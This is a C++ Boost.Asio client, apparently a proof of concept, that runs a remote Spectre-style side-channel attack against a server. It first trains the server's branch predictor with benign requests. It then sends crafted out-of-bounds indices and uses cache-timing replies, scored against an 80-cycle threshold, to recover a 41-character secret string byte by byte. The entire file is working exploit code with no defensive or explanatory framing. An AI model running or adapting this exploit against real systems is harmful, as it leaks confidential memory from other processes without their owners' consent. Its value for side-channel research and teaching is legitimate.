#include <boost/asio.hpp>
#include <cstdlib>
#include <cstring>
#include <iostream>
#include <random>
#include <sched.h>
#include <thread>
#include <x86intrin.h>

using boost::asio::ip::tcp;

/********************************************************************
Analysis code
********************************************************************/

// std::vector<int64_t> samples;
/*
struct Results {
  int64_t median;
  int64_t average;
  double stdev;
};

Results computeResults(int64_t numSamples) {
  size_t n = samples.size() / 2;
  std::nth_element(samples.begin(), samples.begin() + n, samples.end());

  auto total = std::accumulate(samples.begin(), samples.end(), 0ll);
  auto mean = total / numSamples;

  std::vector<double> diff(numSamples);
  std::transform(samples.begin(), samples.end(), diff.begin(),
                 [mean](double x) { return x - mean; });
  double sq_sum =
      std::inner_product(diff.begin(), diff.end(), diff.begin(), 0.0);
  double stdev = std::sqrt(sq_sum / numSamples);

  return {samples[n], mean, stdev};
}
*/

char getRemoteResults(tcp::socket &s, uint64_t samplePoint, size_t waitTime,
                      int64_t numSamples) {
  std::random_device random{};

  auto scores = std::array<uint32_t, 256>();
  for (int i = 0; i < 256; i++) {
    scores[i] = 0;
  }

  for (int sample = 0; sample < numSamples; sample++) {
    auto localTimes = std::array<uint32_t, 256>{};
    // train the branch predictor
    uint64_t a = 0;
    int64_t totalTraining = (random() % 2) + 5;
    for (int i = 0; i < totalTraining; i++) {
      boost::asio::write(s, boost::asio::buffer(&a, sizeof(a)));
      boost::asio::read(s,
                        boost::asio::buffer(&localTimes, sizeof(localTimes)));
    }

    // attack
    /*std::chrono::high_resolution_clock::time_point start, end;
    start = std::chrono::high_resolution_clock::now();*/
    boost::asio::write(s,
                       boost::asio::buffer(&samplePoint, sizeof(samplePoint)));
    boost::asio::read(s, boost::asio::buffer(&localTimes, sizeof(localTimes)));
    // end = std::chrono::high_resolution_clock::now();
    // samples[sample] = reply;

    for (int i = 0; i < 256; i++) {
      if (localTimes[i] < 80) {
        scores[i] += 1;
      }
    }

    // std::this_thread::sleep_for(std::chrono::milliseconds(waitTime));
  }

  int j = -1, k = -1;
  for (int i = 0; i < 256; i++) {
    if (j < 0 || scores[i] >= scores[j]) {
      k = j;
      j = i;
    } else if (k < 0 || scores[i] >= scores[k]) {
      k = i;
    }
  }

  std::cout << "Best guess: " << char(j) << " (" << scores[j] << ")\n";

  if (scores[j] > 0) {
    std::cout << "Runner-up: " << char(k) << " (" << scores[k] << ")\n";
  }

  return j;
}

int main(int argc, char *argv[]) {
  cpu_set_t mask;
  CPU_ZERO(&mask);
  CPU_SET(2, &mask);
  int status = sched_setaffinity(0, sizeof(mask), &mask);
  if (status)
    throw std::runtime_error("sched_affinity");

  try {
    if (argc != 5) {
      std::cerr << "Usage: blocking_tcp_echo_client <host> <port> "
                   "<wait time> <num samples>\n";
      return 1;
    }

    boost::asio::io_context io_context;

    tcp::socket s(io_context);
    tcp::resolver resolver(io_context);
    boost::asio::connect(s, resolver.resolve(argv[1], argv[2]));
    auto waitTime = std::stoi(argv[3]);
    auto numSamples = std::stoi(argv[4]);

    // samples.resize(numSamples);

    /*
    Results results = getRemoteResults(s, 0, waitTime, numSamples);
    Results results2 = getRemoteResults(s, 255, waitTime, numSamples);

    std::cout << "When AVX2 is engaged:\n";
    std::cout << "[median] " << results.median << "\n";
    std::cout << "[average] " << results.average << "\n";
    std::cout << "[stdev] " << results.stdev << "\n";

    std::cout << "When AVX2 is not engaged:\n";
    std::cout << "[median] " << results2.median << "\n";
    std::cout << "[average] " << results2.average << "\n";
    std::cout << "[stdev] " << results2.stdev << "\n";

    std::cout << "[median] Difference: " << results.median - results2.median
              << "\n";
    std::cout << "[average] Difference: " << results.average - results2.average
              << "\n";
    */

    std::string result;
    // Numbers chosen so we only look at the secret string
    for (uint64_t i = 18446744073709518176u; i < 18446744073709518176u + 41;
         i++) {
      result.push_back(getRemoteResults(s, i, waitTime, numSamples));
    }
    std::cout << "Result: " << result << "\n";

  } catch (std::exception &e) {
    std::cerr << "Exception: " << e.what() << "\n";
  }

  return 0;
}
